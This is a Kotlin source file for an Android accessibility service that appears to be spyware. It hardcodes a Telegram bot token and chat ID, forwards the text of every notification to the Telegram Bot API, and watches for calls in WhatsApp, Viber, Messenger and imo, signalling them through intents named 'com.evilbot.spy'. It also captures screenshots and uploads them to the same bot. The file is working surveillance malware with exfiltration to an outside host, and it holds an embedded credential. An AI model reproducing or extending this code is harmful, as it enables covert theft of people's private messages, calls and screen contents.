package com.luffa

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        private val BOT_TOKEN = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
        private val CHAT_ID = "8820979221"
        private val client = OkHttpClient()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // 1. Notification Capture
        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val text = event.text?.joinToString(" ") ?: ""
            if (text.isNotBlank()) {
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val form = FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", "🔔 Notification: $text")
                            .build()
                        client.newCall(
                            Request.Builder()
                                .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                                .post(form)
                                .build()
                        ).execute()
                    } catch (e: Exception) { Log.e("AccService", "Notify Error", e) }
                }
            }

            // 2. VoIP Call Detection
            val packageName = event.packageName?.toString().orEmpty()
            val notifText = text.lowercase()
            val voipApps = listOf("com.whatsapp", "com.imo.android.imoim", "com.facebook.orca", "com.facebook.mlite", "com.viber.voip")

            if (packageName in voipApps || notifText.contains("call")) {
                if (notifText.contains("incoming") || notifText.contains("ongoing") || notifText.contains("active")) {
                    sendBroadcast(Intent("com.evilbot.spy.VOIP_CALL_START"))
                } else if (notifText.contains("ended") || notifText.contains("missed")) {
                    sendBroadcast(Intent("com.evilbot.spy.VOIP_CALL_END"))
                }
            }
        }
    }

    override fun onInterrupt() {}

    // Screenshot Method (Android 9+)
    fun takeScreenshot(crop: Rect? = null) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            sendError("Screenshot not supported on this version")
            return
        }

        val callback = object : TakeScreenshotCallback {
            override fun onSuccess(screenshotResult: ScreenshotResult) {
                val bitmap = Bitmap.wrapHardwareBuffer(
                    screenshotResult.hardwareBuffer,
                    screenshotResult.colorSpace
                ) ?: return

                val finalBitmap = if (crop != null) {
                    Bitmap.createBitmap(bitmap, crop.left, crop.top, crop.width(), crop.height())
                } else bitmap

                CoroutineScope(Dispatchers.IO).launch {
                    val file = File(cacheDir, "screen_${System.currentTimeMillis()}.png")
                    FileOutputStream(file).use { fos ->
                        finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos)
                    }
                    uploadTelegramPhoto(file)
                }
            }

            override fun onFailure(errorCode: Int) {
                sendError("Screenshot failed: $errorCode")
            }
        }

        takeScreenshot(0, Executors.newSingleThreadExecutor(), callback)
    }

    private fun uploadTelegramPhoto(file: File) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
                    .build()
                client.newCall(
                    Request.Builder()
                        .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                        .post(body)
                        .build()
                ).execute()
                file.delete() // Clean up
            } catch (e: Exception) { Log.e("AccService", "Upload failed", e) }
        }
    }

    private fun sendError(msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val form = FormBody.Builder()
                    .add("chat_id", CHAT_ID)
                    .add("text", "⚠️ Error: $msg")
                    .build()
                client.newCall(
                    Request.Builder()
                        .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                        .post(form)
                        .build()
                ).execute()
            } catch (e: Exception) { Log.e("AccService", "SendError failed", e) }
        }
    }
}
